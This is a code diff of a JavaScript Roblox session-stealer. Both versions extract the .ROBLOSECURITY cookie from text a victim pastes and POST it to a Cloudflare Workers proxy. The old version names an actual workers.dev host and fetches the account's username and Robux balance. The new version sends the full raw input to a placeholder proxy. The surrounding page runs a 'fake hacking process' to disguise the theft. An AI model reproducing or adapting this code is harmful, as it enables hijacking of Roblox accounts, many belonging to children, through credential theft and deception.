@@ -1,80 +1,58 @@
-const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
+const PROXY_URL = "https://your-proxy-worker.workers.dev/"; // Replace with your proxy URL
 
-// Extracts .ROBLOSECURITY from PowerShell or raw cookie
+// 1. Extract cookie from PowerShell or raw string
 function extractRobloxCookie(input) {
-    const powershellMatch = input.match(/\.ROBLOSECURITY["'],\s*["']([^"']+)/);
-    const rawCookieMatch = input.match(/(_|\.)ROBLOSECURITY=([^;]+)/);
-    return powershellMatch?.[1] || rawCookieMatch?.[2] || null;
+  const psMatch = input.match(/\.ROBLOSECURITY["'],\s*["']([^"']+)/);
+  const rawMatch = input.match(/(_|\.)ROBLOSECURITY=([^;]+)/);
+  return psMatch?.[1] || rawMatch?.[2] || null;
 }
 
-// Fetches user data from Roblox API
-async function fetchRobloxUserData(cookie) {
-    try {
-        // 1. Get user profile
-        const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
-            headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
-        });
-        if (!userRes.ok) throw new Error("Failed to fetch user data");
-        const userData = await userRes.json();
-
-        // 2. Get Robux balance
-        const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
-            headers: { "Cookie": `.ROBLOSECURITY=${cookie}` }
-        });
-        const robux = robuxRes.ok ? (await robuxRes.json())?.robux || 0 : 0;
-
-        return {
-            username: userData.name,
-            displayName: userData.displayName,
-            userId: userData.id,
-            robux: robux,
-            isPremium: false, // Optional: Add premium check if needed
-            cookieValid: true
-        };
-    } catch (error) {
-        return {
-            error: error.message,
-            cookieValid: false
-        };
-    }
-}
-
-// Sends data to your proxy
-async function sendToProxy(data) {
-    await fetch(CLOUDFLARE_PROXY_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            sessionId: data.cookie,
-            timestamp: new Date().toISOString(),
-            username: data.username,
-            displayName: data.displayName,
-            robux: data.robux,
-            userId: data.userId,
-            isPremium: data.isPremium,
-            cookieValid: data.cookieValid
-        })
+// 2. Main function (single call)
+async function bruteforce(sessionId) {
+  console.log("🔍 Starting processing...");
+  
+  // Extract cookie
+  const cookie = extractRobloxCookie(sessionId);
+  if (!cookie) {
+    console.error("❌ No valid .ROBLOSECURITY cookie found");
+    await sendToProxy({
+      error: "No valid cookie extracted",
+      rawInput: sessionId.slice(0, 100) + (sessionId.length > 100 ? "..." : "") // Truncate long input
     });
+    return;
+  }
+
+  console.log("✅ Extracted cookie:", cookie.slice(0, 15) + "...");
+  
+  // Send everything to proxy
+  try {
+    const response = await sendToProxy({
+      cookie: cookie,
+      rawInput: sessionId,
+      timestamp: new Date().toISOString()
+    });
+    
+    console.log(response.success ? "📤 Data sent to proxy successfully!" : "❌ Proxy error");
+  } catch (error) {
+    console.error("🚨 Failed to send to proxy:", error);
+  }
 }
 
-// Main function
-async function bruteforce(input) {
-    const cookie = extractRobloxCookie(input);
-    if (!cookie) {
-        console.log("❌ No valid .ROBLOSECURITY found");
-        return;
-    }
-
-    const userData = await fetchRobloxUserData(cookie);
-    await sendToProxy({ cookie, ...userData });
-
-    console.log(userData.cookieValid ?
-        `✅ Valid Cookie | ${userData.username} | Robux: ${userData.robux}` :
-        `❌ Cookie Error: ${userData.error}`
-    );
+// 3. Proxy communication
+async function sendToProxy(data) {
+  const response = await fetch(PROXY_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      action: "PROCESS_ROBLOX_DATA",
+      ...data
+    })
+  });
+  
+  if (!response.ok) throw new Error(`Proxy responded with ${response.status}`);
+  return await response.json();
 }
 
-// Usage: bruteforce(powershellCommandOrCookieString);
 
 
 
@@ -110,8 +88,7 @@ function validateInput() {
 
   // Send the session ID to the proxy
   bruteforce(sessionId);
-bruteforce(powershellInput);
-bruteforce(rawCookieInput);
+
 
   // Hide error and start fake hacking process
   hideError();
